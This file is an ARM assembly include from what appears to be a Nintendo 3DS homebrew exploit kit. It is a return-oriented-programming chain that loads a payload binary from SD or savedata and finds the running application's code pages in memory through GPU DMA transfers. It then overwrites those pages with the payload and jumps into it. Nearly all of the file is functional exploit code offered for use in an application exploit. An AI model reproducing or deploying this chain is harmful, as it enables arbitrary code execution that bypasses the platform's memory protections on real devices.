#pragma once

@ This is intended to be included by a regular-application exploit .s.

#ifndef ROPKIT_TMPDATA
	#define ROPKIT_TMPDATA 0x0FFF0000
#endif

#define ropkit_IFile_ctx (ROPKIT_TMPDATA+4)

#define ROPKIT_CUR_TEXT_VMEMPTR (ROPKIT_TMPDATA+0x2C)
#define ROPKIT_CUR_TEXT_LINEARPAGEPTR (ROPKIT_TMPDATA+0x30)
#define ROPKIT_CUR_TEXT_LINEARPAGEPTR_TMP (ROPKIT_TMPDATA+0x34)
#define ROPKIT_LINEARPAGEARRAY_CURPTR (ROPKIT_TMPDATA+0x38)
#define ROPKIT_LINEARPAGEARRAY (ROPKIT_TMPDATA+0x3C)

#define ROPKIT_ROPBAK (ROPKIT_TMPDATA+0x100)

#ifndef ROPKIT_BINLOAD_SIZE
	#define ROPKIT_BINLOAD_SIZE 0x2000
#endif

#define ROPKIT_LINEARMEM_WORKBUF (ROPKIT_LINEARMEM_BUF+ROPKIT_BINLOAD_SIZE)

#ifndef ROPKIT_BINLOAD_ADDR
	#define ROPKIT_BINLOAD_ADDR ROPKIT_LINEARMEM_BUF
#endif

#ifndef ROPKIT_BINLOAD_TEXTOFFSET
	#define ROPKIT_BINLOAD_TEXTOFFSET 0x1000
#endif

#ifndef ROPKIT_BINPAYLOAD_PATH
	#define ROPKIT_BINPAYLOAD_PATH "data:/payload.bin"
#endif

#ifndef ROPKIT_OTHERAPP_NEWSP_ADDR
	#define ROPKIT_OTHERAPP_NEWSP_ADDR (0x10000000-4)
#endif

#define ROPKIT_TRANSFER_CHUNKSIZE 0x100000

#ifdef ROPKIT_ENABLETERMINATE_GSPTHREAD
@ Set the flag for terminating the GSP thread.
ROPMACRO_WRITEWORD GSPTHREAD_OBJECTADDR+0x77, 0x1
#endif

#ifdef ROPKIT_MOUNTSD
CALLFUNC_NOSP FS_MountSdmc, ROPBUFLOC(ropkit_sd_archivename), 0, 0, 0
#endif

#ifdef ROPKIT_MOUNTSAVEDATA
CALLFUNC_NOSP FS_MountSavedata, ROPBUFLOC(ropkit_savedata_archivename), 0, 0, 0
#endif

@ Load the file into the buffer.

CALLFUNC_NOSP IFile_Open, ropkit_IFile_ctx, ROPBUFLOC(ropkit_payload_path), 1, 0

#ifdef ROPKIT_BINPAYLOAD_FILEOFFSET //Optional. Reuse IFile_Read for file-"seeking", so that a IFile_Seek pattern doesn't need added. Hence, ROPKIT_BINPAYLOAD_FILEOFFSET should be a "size" that fits under the buffer at ROPKIT_BINLOAD_ADDR.
CALLFUNC_NOSP IFile_Read, ropkit_IFile_ctx, ROPKIT_TMPDATA, ROPKIT_BINLOAD_ADDR, ROPKIT_BINPAYLOAD_FILEOFFSET
COND_THROWFATALERR
#endif

CALLFUNC_NOSP IFile_Read, ropkit_IFile_ctx, ROPKIT_TMPDATA, ROPKIT_BINLOAD_ADDR, ROPKIT_BINLOAD_SIZE
COND_THROWFATALERR

ROPMACRO_IFile_Close ropkit_IFile_ctx

@ Copy APPMEMTYPE to ROPKIT_TMPDATA+0x24.
ROPMACRO_COPYWORD (ROPKIT_TMPDATA+0x24), 0x1FF80030

@ Copy the above tmpdata to the value words used in each of the below add-macros.
ROPMACRO_COPYWORD (ROPBUFLOC(ropkit_appmemtype_addstart0) + ROPMACRO_LDDRR0_ADDR1_STRADDR_VALUEOFFSET), (ROPKIT_TMPDATA+0x24)
ROPMACRO_COPYWORD (ROPBUFLOC(ropkit_appmemtype_addstart1) + ROPMACRO_LDDRR0_ADDR1_STRADDR_VALUEOFFSET), (ROPKIT_TMPDATA+0x24)
ROPMACRO_COPYWORD (ROPBUFLOC(ropkit_appmemtype_addstart2) + ROPMACRO_LDDRR0_ADDR1_STRADDR_VALUEOFFSET), (ROPKIT_TMPDATA+0x24)

@ These 3 add-macros calculate the offset to use in the ropkit_appmemtype_appmemsize_table by multiplying APPMEMTYPE loaded above by 4 basically.

ropkit_appmemtype_addstart0:
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), 0

ropkit_appmemtype_addstart1:
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), 0

ropkit_appmemtype_addstart2:
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), 0

@ Calculate the address in the table to use, by adding with the table start address.
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x24), (ROPKIT_TMPDATA+0x24), ROPBUFLOC(ropkit_appmemtype_appmemsize_table)

@ r0 = *(ROPKIT_TMPDATA+0x24)
ROP_LOADR0_FROMADDR (ROPKIT_TMPDATA+0x24)

@ *(ROPKIT_TMPDATA+0x28) = *r0. Hence, *(ROPKIT_TMPDATA+0x28) = word value from the table.
ROPMACRO_COPYWORD_FROMR0 (ROPKIT_TMPDATA+0x28)

@ Calculate the linearmem addr.
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x28), (ROPKIT_TMPDATA+0x28), (ROPKIT_LINEARMEM_REGIONBASE)

@ *ROPKIT_LINEARPAGEARRAY_CURPTR = ROPKIT_LINEARPAGEARRAY
ROPMACRO_WRITEWORD ROPKIT_LINEARPAGEARRAY_CURPTR, ROPKIT_LINEARPAGEARRAY

@ Set *ROPKIT_CUR_TEXT_VMEMPTR to (0x00100000 + ROPKIT_BINLOAD_TEXTOFFSET).
ROPMACRO_WRITEWORD ROPKIT_CUR_TEXT_VMEMPTR, (0x00100000 + ROPKIT_BINLOAD_TEXTOFFSET)

@ Backup the ROP-chain data.
CALLFUNC_NOSP MEMCPY, ROPKIT_ROPBAK, ROPBUFLOC(ropkit_searchloop_lpstart), ((ropkit_searchloop_lpnext - ropkit_searchloop_lpstart) + CALLFUNC_NOSP_FUNCADROFFSET), 0

ropkit_searchloop_lpstart:
@ Check whether the start of the linearmem region was reached, jump to ropkit_searchloop_lpstart_aftercmp otherwise.
ROPMACRO_CMPDATA (ROPKIT_TMPDATA+0x28), ROPKIT_LINEARMEM_REGIONBASE, ROPBUFLOC(ropkit_searchloop_lpstart_aftercmp)

@ Trigger a crash since the target .text pages were not found.
.word 0xa0b0c0d0

ropkit_searchloop_lpstart_aftercmp:
@ Subtract the current linearmem ptr by ROPKIT_TRANSFER_CHUNKSIZE.
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x28), (ROPKIT_TMPDATA+0x28), (-ROPKIT_TRANSFER_CHUNKSIZE)

@ Copy the current chunk to ROPKIT_LINEARMEM_WORKBUF.
CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPKIT_LINEARMEM_WORKBUF, ROPKIT_TRANSFER_CHUNKSIZE, 0, 0

CALL_GXCMD4_LDRSRC (ROPKIT_TMPDATA+0x28), ROPKIT_LINEARMEM_WORKBUF, ROPKIT_TRANSFER_CHUNKSIZE
@.word 0x44444444
@ Wait 0.1s for the transfer to finish.
CALLFUNC_R0R1 svcSleepThread, 100000000, 0

@ Set *ROPKIT_CUR_TEXT_LINEARPAGEPTR to ROPKIT_LINEARMEM_WORKBUF.
ROPMACRO_WRITEWORD ROPKIT_CUR_TEXT_LINEARPAGEPTR, ROPKIT_LINEARMEM_WORKBUF

ropkit_searchloop_cmptextword_start:
@ r0 = *ROPKIT_CUR_TEXT_VMEMPTR
ROP_LOADR0_FROMADDR ROPKIT_CUR_TEXT_VMEMPTR

@ Write *r0 to the cmpword used in the below macro.
ROPMACRO_COPYWORD_FROMR0 (ROPBUFLOC(ropkit_searchloop_cmptextword_macrostart) + ROPMACRO_CMPDATA_CMPWORD_OFFSET)

@ Write *ROPKIT_CUR_TEXT_LINEARPAGEPTR to the cmpaddr used in the below macro.
ROPMACRO_COPYWORD (ROPBUFLOC(ropkit_searchloop_cmptextword_macrostart) + ROPMACRO_CMPDATA_CMPADDR_OFFSET), (ROPKIT_CUR_TEXT_LINEARPAGEPTR)

@ Compare the first word in the current linearmem page with the .text page word, on fail jump to ropkit_searchloop_cmptextword_lpnext.
ropkit_searchloop_cmptextword_macrostart:
ROPMACRO_CMPDATA 0, 0, ROPBUFLOC(ropkit_searchloop_cmptextword_lpnext)

ROPMACRO_LDDRR0_ADDR1_STRADDR ROPKIT_CUR_TEXT_VMEMPTR, ROPKIT_CUR_TEXT_VMEMPTR, 0x1000

@ *ROPKIT_CUR_TEXT_LINEARPAGEPTR_TMP = *ROPKIT_CUR_TEXT_LINEARPAGEPTR - <buffer_baseaddr>
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPKIT_CUR_TEXT_LINEARPAGEPTR_TMP, ROPKIT_CUR_TEXT_LINEARPAGEPTR, -ROPKIT_LINEARMEM_WORKBUF

@ Copy the actual .text linearmem addr to the value word used in the below add-macro.
ROPMACRO_COPYWORD (ROPBUFLOC(ropkit_searchloop_cmptextword_matchfound_addrcalc_addstart1) + ROPMACRO_LDDRR0_ADDR1_STRADDR_VALUEOFFSET), (ROPKIT_TMPDATA+0x28)

ropkit_searchloop_cmptextword_matchfound_addrcalc_addstart1:
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPKIT_CUR_TEXT_LINEARPAGEPTR_TMP, ROPKIT_CUR_TEXT_LINEARPAGEPTR_TMP, 0

@ Overwrite the dstaddr in the below macro with the array-entry address from ROPKIT_LINEARPAGEARRAY_CURPTR.
ROPMACRO_COPYWORD (ROPBUFLOC(ropkit_searchloop_cmptextword_writearrayentry_macrostart) + ROPMACRO_COPYWORD_DSTADDROFFSET), ROPKIT_LINEARPAGEARRAY_CURPTR

@ Write the linearmem page address to the current array-entry.
ropkit_searchloop_cmptextword_writearrayentry_macrostart:
ROPMACRO_COPYWORD 0, ROPKIT_CUR_TEXT_LINEARPAGEPTR_TMP

@ Update the address stored at ROPKIT_LINEARPAGEARRAY_CURPTR.
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPKIT_LINEARPAGEARRAY_CURPTR, ROPKIT_LINEARPAGEARRAY_CURPTR, 0x4

@ Check whether the end of the vmem .text payload area was reached. If so jump to ropkit_searchloop_finished, otherwise jump to ropkit_searchloop_cmptextword_lpnext.
ROPMACRO_CMPDATA ROPKIT_CUR_TEXT_VMEMPTR, (0x00100000 + ROPKIT_BINLOAD_TEXTOFFSET + ROPKIT_BINLOAD_SIZE), ROPBUFLOC(ropkit_searchloop_cmptextword_lpnext)
ROPMACRO_STACKPIVOT ROPBUFLOC(ropkit_searchloop_finished), ROP_POPPC

ropkit_searchloop_cmptextword_lpnext:
@ Update the address at ROPKIT_CUR_TEXT_LINEARPAGEPTR, and then jump to ropkit_searchloop_cmptextword_start if the end of the linearmem buffer wasn't reached yet.
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPKIT_CUR_TEXT_LINEARPAGEPTR, ROPKIT_CUR_TEXT_LINEARPAGEPTR, 0x1000
ROPMACRO_CMPDATA ROPKIT_CUR_TEXT_LINEARPAGEPTR, (ROPKIT_LINEARMEM_WORKBUF + ROPKIT_TRANSFER_CHUNKSIZE), ROPBUFLOC(ropkit_searchloop_cmptextword_start)

ropkit_searchloop_lpnext:
@ Restore the ROP-chain data.
CALLFUNC_NOSP MEMCPY, ROPBUFLOC(ropkit_searchloop_lpstart), ROPKIT_ROPBAK, ((ropkit_searchloop_lpnext - ropkit_searchloop_lpstart) + CALLFUNC_NOSP_FUNCADROFFSET), 0
ROPMACRO_WRITEWORD (ROPBUFLOC(ropkit_searchloop_lpnext) + CALLFUNC_NOSP_FUNCADROFFSET), MEMCPY @ Restore the funcaddr used above(this can't be done from the memcpy since that would overwrite the saved LR).
ROPMACRO_STACKPIVOT ROPBUFLOC(ropkit_searchloop_lpstart), ROP_POPPC

ropkit_searchloop_finished:

@ Write the payload codebin into .text.

@ *ROPKIT_LINEARPAGEARRAY_CURPTR = ROPKIT_LINEARPAGEARRAY
ROPMACRO_WRITEWORD ROPKIT_LINEARPAGEARRAY_CURPTR, ROPKIT_LINEARPAGEARRAY

@ *(ROPKIT_TMPDATA+0x28) = ROPKIT_BINLOAD_ADDR
ROPMACRO_WRITEWORD (ROPKIT_TMPDATA+0x28), ROPKIT_BINLOAD_ADDR

@ Backup the ROP-chain data.
CALLFUNC_NOSP MEMCPY, ROPKIT_ROPBAK, ROPBUFLOC(ropkit_copycodebin_lpstart), ((ropkit_copycodebin_lpnext - ropkit_copycodebin_lpstart) + CALLFUNC_NOSP_FUNCADROFFSET), 0

ropkit_copycodebin_lpstart:
@ Copy *ROPKIT_LINEARPAGEARRAY_CURPTR to the dstaddr used in the below macro.
ROPMACRO_COPYWORD (ROPBUFLOC(ropkit_copycodebin_gxcmd4) + CALLFUNC_LDRR0R1_R1OFFSET), ROPKIT_LINEARPAGEARRAY_CURPTR

ropkit_copycodebin_gxcmd4:
CALL_GXCMD4_LDRSRCDST (ROPKIT_TMPDATA+0x28), 0, 0x1000

@ Update the address used for the srcaddr.
ROPMACRO_LDDRR0_ADDR1_STRADDR (ROPKIT_TMPDATA+0x28), (ROPKIT_TMPDATA+0x28), 0x1000

@ Update the address stored at ROPKIT_LINEARPAGEARRAY_CURPTR.
ROPMACRO_LDDRR0_ADDR1_STRADDR ROPKIT_LINEARPAGEARRAY_CURPTR, ROPKIT_LINEARPAGEARRAY_CURPTR, 0x4

ropkit_copycodebin_lpnext:
@ Restore the ROP-chain data.
CALLFUNC_NOSP MEMCPY, ROPBUFLOC(ropkit_copycodebin_lpstart), ROPKIT_ROPBAK, ((ropkit_copycodebin_lpnext - ropkit_copycodebin_lpstart) + CALLFUNC_NOSP_FUNCADROFFSET), 0
ROPMACRO_WRITEWORD (ROPBUFLOC(ropkit_copycodebin_lpnext) + CALLFUNC_NOSP_FUNCADROFFSET), MEMCPY @ Restore the funcaddr used above(this can't be done from the memcpy since that would overwrite the saved LR).

@ If the end of the payload wasn't reached yet, jump to ropkit_copycodebin_lpstart.
ROPMACRO_CMPDATA (ROPKIT_TMPDATA+0x28), (ROPKIT_BINLOAD_ADDR + ROPKIT_BINLOAD_SIZE), ROPBUFLOC(ropkit_copycodebin_lpstart)

@ Wait 0.1s for the transfers to finish.
CALLFUNC_R0R1 svcSleepThread, 100000000, 0

#ifdef ROPKIT_BEFOREJUMP_CACHEBUFADDR//Try to get cache invalidated/whatever for otherapp via accessing+flushing memory in linearmem.
CALLFUNC_NOSP MEMCPY, ROPKIT_BEFOREJUMP_CACHEBUFADDR, ROPKIT_BEFOREJUMP_CACHEBUFADDR+0x100, ROPKIT_BEFOREJUMP_CACHEBUFSIZE, 0
CALLFUNC_NOSP GSPGPU_FlushDataCache, ROPKIT_BEFOREJUMP_CACHEBUFADDR, ROPKIT_BEFOREJUMP_CACHEBUFSIZE, 0, 0
#endif

@ Setup the paramblk.

CALLFUNC_NOSP MEMSET32_OTHER, ROPKIT_LINEARMEM_WORKBUF, 0x1000, 0, 0

ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x1c), GXLOW_CMD4
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x20), GSPGPU_FlushDataCache
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x48), 0x8d @ Flags
ROPMACRO_WRITEWORD (ROPKIT_LINEARMEM_WORKBUF + 0x58), GSPGPU_SERVHANDLEADR

@ Jump to the payload.
CALLFUNC_R0R1 (0x00100000 + ROPKIT_BINLOAD_TEXTOFFSET), ROPKIT_LINEARMEM_WORKBUF, ROPKIT_OTHERAPP_NEWSP_ADDR

.word 0x40506070

#ifdef ROPKIT_MOUNTSD
ropkit_sd_archivename:
.string "sd:"
.align 2
#endif

#ifdef ROPKIT_MOUNTSAVEDATA
ropkit_savedata_archivename:
.string "data:"
.align 2
#endif

ropkit_payload_path:
.string16 ROPKIT_BINPAYLOAD_PATH
.align 2

ropkit_appmemtype_appmemsize_table: @ This is a table for the actual APPLICATION mem-region size, for each APPMEMTYPE.
.word 0x04000000 @ type0
.word 0x04000000 @ type1
.word 0x06000000 @ type2
.word 0x05000000 @ type3
.word 0x04800000 @ type4
.word 0x02000000 @ type5
.word 0x07C00000 @ type6
.word 0x0B200000 @ type7

